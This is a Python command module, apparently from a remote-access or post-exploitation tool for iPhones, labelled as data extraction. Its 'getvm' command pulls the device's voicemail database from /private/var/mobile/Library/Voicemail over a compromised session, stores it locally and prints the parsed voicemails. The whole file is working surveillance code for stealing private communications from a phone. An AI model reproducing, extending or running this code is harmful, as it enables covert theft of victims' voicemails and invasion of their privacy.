import os
import modules.helper as h
import modules.dataformat as dformat
import modules.dbfileparser as dbfparser

class command:
    def __init__(self):
        self.name = "getvm"
        self.description = "show all voicemail data"
        self.category = "data_extraction"

    def run(self, session, cmd_data):
        file_name = "voicemail.db"
        h.info_general("Downloading {0}".format(file_name))
        data = session.download_file('/private/var/mobile/Library/Voicemail/'+file_name)
        if data and session.vm_fetched == False:
            f = open(os.path.join('downloads', file_name), 'wb')
            f.write(data)
            f.close()
            session.vm_fetched = True
        voicemail_db_file = os.path.join('downloads', file_name)
        vm = dbfparser.parse_voicemail_db(voicemail_db_file)
        dformat.print_formatted_voicemails(vm)
